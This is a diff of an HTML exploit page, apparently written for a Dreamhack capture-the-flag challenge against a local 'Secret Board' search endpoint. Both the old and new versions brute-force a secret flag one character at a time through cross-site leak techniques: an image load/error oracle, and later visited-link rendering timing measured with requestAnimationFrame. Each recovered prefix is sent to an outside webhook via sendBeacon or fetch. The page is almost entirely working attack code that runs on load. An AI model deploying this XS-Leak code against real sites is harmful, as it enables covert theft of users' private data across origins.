@@ -1,32 +1,181 @@
-<!doctype html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XS-Leak Exploit - Secret Board</title>
+  <style>
+    #status {
+      font-family: monospace;
+      font-size: 16px;
+      padding: 20px;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
 <body>
-<script>
-const alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_';
-let known = 'DH{'; 
+  <div id="status">Initializing exploit...</div>
 
-function probe(candidate) {
-  return new Promise(resolve => {
-    const img = new Image();
-    img.onload = () => resolve(true);  
-    img.onerror = () => resolve(false); 
-    img.src = 'http://localhost:3000/posts/search?query=' +
-              encodeURIComponent(candidate) + '&t=' + Math.random();
-    document.body.appendChild(img);
-  });
-}
+  <script>
+    // Configuration - CHANGE THESE
+    const TARGET = "http://localhost:3000";
+    const WEBHOOK = "https://sixzggh.request.dreamhack.games"; // e.g., https://webhook.site/xxx or your server
+    const CHARSET = "0123456789ABCDEF}";
+    const FLAG_PREFIX = "DH{";
+    const GARBAGE_TEXT = "X".repeat(1000); // Heavy text for rendering
 
-async function leak() {
-  while (!known.endsWith('}')) {
-    for (const c of alphabet) {
-      if (await probe(known + c)) {
-        known += c;
-        navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', known);
-        break;
+    let leaked = FLAG_PREFIX;
+    let popup = null;
+    let controlTicks = 0;
+
+    function log(msg) {
+      const el = document.getElementById("status");
+      el.textContent = msg;
+      console.log(msg);
+    }
+
+    function sleep(ms) {
+      return new Promise(r => setTimeout(r, ms));
+    }
+
+    // Visit URL in popup - 200 response goes to history, 404 doesn't
+    async function visitUrl(url) {
+      if (!popup || popup.closed) {
+        popup = window.open("about:blank", "leakwin");
+      }
+      popup.location = url;
+      await sleep(800); // Wait for navigation and history update
+    }
+
+    // Measure rendering ticks using requestAnimationFrame oscillation technique
+    async function measureTicks(url) {
+      return new Promise((resolve) => {
+        const basisUrl = "https://" + Math.random() + ".invalid/" + Date.now();
+
+        // Create link with heavy rendering CSS
+        const link = document.createElement('a');
+        link.style.cssText = `
+          filter: contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);
+          transform: perspective(100px) rotateY(37deg);
+          position: absolute;
+          left: -9999px;
+        `;
+        link.appendChild(document.createTextNode(GARBAGE_TEXT));
+        link.href = basisUrl;
+        document.body.appendChild(link);
+
+        let tickCount = 0;
+        let tickRequestId;
+        let isPointingToBasisUrl = true;
+
+        // Oscillate href between target and basis URL
+        const oscillate = setInterval(() => {
+          link.href = isPointingToBasisUrl ? url : basisUrl;
+          isPointingToBasisUrl = !isPointingToBasisUrl;
+        }, 0);
+
+        // Count animation frames
+        const countTicks = () => {
+          tickCount++;
+          tickRequestId = requestAnimationFrame(countTicks);
+        };
+        tickRequestId = requestAnimationFrame(countTicks);
+
+        // Stop after measurement period
+        setTimeout(() => {
+          clearInterval(oscillate);
+          cancelAnimationFrame(tickRequestId);
+          link.remove();
+          resolve(tickCount);
+        }, 200);
+      });
+    }
+
+    // Get baseline tick count for unvisited URL
+    async function getControlTicks() {
+      const unvisitedUrl = "https://" + Math.random() + ".invalid/control";
+      const ticks = await measureTicks(unvisitedUrl);
+      return ticks;
+    }
+
+    // Check if URL returns 200 (visited) or 404 (not visited)
+    async function checkUrl(url) {
+      // Navigate popup to URL - adds to history if 200
+      await visitUrl(url);
+      await sleep(200);
+
+      // Measure rendering ticks
+      const ticks = await measureTicks(url);
+
+      // Visited links render faster (fewer ticks)
+      // Threshold: if ratio < 0.7, it's visited (200)
+      const ratio = ticks / controlTicks;
+      console.log(`URL: ${url}, Ticks: ${ticks}, Control: ${controlTicks}, Ratio: ${ratio.toFixed(3)}`);
+
+      return ratio < 0.8; // Visited = fewer ticks = lower ratio
+    }
+
+    async function findNextChar() {
+      for (const char of CHARSET) {
+        const testQuery = leaked + char;
+        const url = `${TARGET}/posts/search?query=${encodeURIComponent(testQuery)}`;
+
+        log(`Testing: ${testQuery}\nLeaked so far: ${leaked}`);
+
+        const isMatch = await checkUrl(url);
+
+        if (isMatch) {
+          return char;
+        }
+
+        await sleep(100);
+      }
+      return null;
+    }
+
+    async function exploit() {
+      log("Starting XS-Leak HTTP Status Code attack...\nCalibrating...");
+
+      // Get baseline control ticks
+      controlTicks = await getControlTicks();
+      log(`Control ticks: ${controlTicks}\nStarting character brute-force...`);
+
+      // Verify prefix first
+      const prefixUrl = `${TARGET}/posts/search?query=${encodeURIComponent(FLAG_PREFIX)}`;
+      await visitUrl(prefixUrl);
+      const prefixTicks = await measureTicks(prefixUrl);
+      log(`Prefix test - Ticks: ${prefixTicks}, Ratio: ${(prefixTicks/controlTicks).toFixed(3)}`);
+
+      await sleep(500);
+
+      while (!leaked.endsWith("}")) {
+        const nextChar = await findNextChar();
+
+        if (nextChar === null) {
+          log(`Could not find next character.\nLeaked: ${leaked}`);
+          // Send partial result
+          sendToWebhook(leaked);
+          break;
+        }
+
+        leaked += nextChar;
+        log(`Found: ${nextChar}\nLeaked: ${leaked}`);
+
+        // Send progress to webhook
+        sendToWebhook(leaked);
+
+        if (nextChar === "}") {
+          log(`\n=== FLAG FOUND ===\n${leaked}`);
+          break;
+        }
+
+        await sleep(300);
       }
     }
-  }
-  navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', 'FLAG=' + known);
-}
-leak();
-</script>
+
+    function sendToWebhook(data) {
+      if (WEBHOOK === "YOUR_WEBHOOK_URL") return;
+      fetch(`${WEBHOOK}?flag=${encodeURIComponent(data)}`, { mode: 'no-cors' }).catch(() => {});
+    }
+    window.onload = () => setTimeout(exploit, 500);
+  </script>
 </body>
+</html>
